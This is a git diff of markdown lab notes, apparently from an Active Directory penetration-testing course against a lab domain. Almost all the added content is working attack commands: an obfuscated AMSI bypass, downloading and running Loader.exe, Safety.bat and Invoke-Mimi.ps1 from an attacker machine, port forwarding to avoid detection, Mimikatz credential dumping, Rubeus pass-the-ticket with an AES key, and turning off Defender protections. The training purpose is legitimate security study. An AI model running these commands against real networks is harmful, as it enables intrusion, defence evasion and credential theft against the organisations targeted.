@@ -456,11 +456,12 @@ Copy the Loader.exe and Safety.bat to dcorp-mgmt:
 ![image](https://github.com/user-attachments/assets/26f1bf5b-45ff-477d-9f18-4ee1cba25ef5)
 
 Extract credentials: 
-
+```
 C:\Windows\system32> winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"  
-
+```
+```
 C:\Windows\system32>winrs -r:dcorp-mgmt C:\Users\Public\Safety.bat 
-
+```
 Invoke-Mimi for extracting credentials 
 We could also use Invoke-Mimi with PSRemoting. Take a session to dcorp-mgmt with PSRemoting. 
 
@@ -479,22 +480,66 @@ C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn%/use
 ```
 The new process starts with the privileges of svcadmin!  
 
+```
+C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
+S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> winrs -r:dcorp-mgmt cmd /c "set computername && set username" 
+```
 
+We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. 
+```
+PS C:\Users\Administrator\.jenkins\workspace\Projectx>iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe 
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe 
+```
+Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt: 
+```
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> $null | winrs r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+C:\AD\Tools>ArgSplit.bat 
+[!] Argument Limit: 180 characters 
+[+] Enter a string: sekurlsa::ekeys
+```
+```
+PS C:\Users\Administrator\.jenkins\workspace\Projectx>iwr http://172.16.100.x/Safety.bat -OutFile C:\Users\Public\Safety.bat 
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> echo F | xcopy C:\Users\Public\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat 
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> $null | winrs r:dcorp-mgmt "cmd /c C:\Users\Public\Safety.bat" 
+```
+Abuse using PowerShell Remoting Check if we can run commands on dcorp-mgmt using PowerShell remoting. 
+```
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> Invoke-Command ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt ciadmin dcorp-mgmt 
+```
+Now, let’s use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin "svcadmin". Host Invoke-Mimi.ps1 on your studentx machine and run the below command on the reverse shell:  
+```
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)  
+```
+Now, to use Invoke-Mimi on dcorp-mgmt, we must disable AMSI there. Please note that we can use the AMSI bypass we have been using or the built-in Set-MpPrefernce as well because we have administrative access on dcorp-mgmt: 
 
+```
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local  
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> Invoke-command ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess 
+PS C:\Users\Administrator\.jenkins\workspace\Projectx> Invoke-command ScriptBlock ${function:Invoke-Mimi} -Session $sess 
+```
+```
+C:\Windows\system32>C:\AD\Tools\ArgSplit.bat 
+[!] Argument Limit: 180 characters 
+[+] Enter a string: asktgt 
+set "Pwn=%u%%v%%w%%x%%y%%z%" 
+```
+C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
+C:\Windows\system32>winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin 
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+## Derivative Local Admin:
+Now moving on to the next task, we need to escalate to domain admin using derivative local admin. Let’s find out the machines on which we have local admin privileges. On a PowerShell session started using Invisi-Shell, enter the following command. 
+```
+PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1 
+PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess dcorp-adminsrv [snip] 
+```
+```
+C:\AD\Tools>winrs -r:dcorp-adminsrv cmd 
+Microsoft Windows [Version 10.0.20348.1249] 
+(c) Microsoft Corporation. All rights reserved. 
+C:\Users\studentx>reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2 
+```
+```
+[dcorp-adminsrv]: PS C:\Users\studentx\Documents> Set-MpPreference DisableRealtimeMonitoring $true -Verbose 
+VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'. 
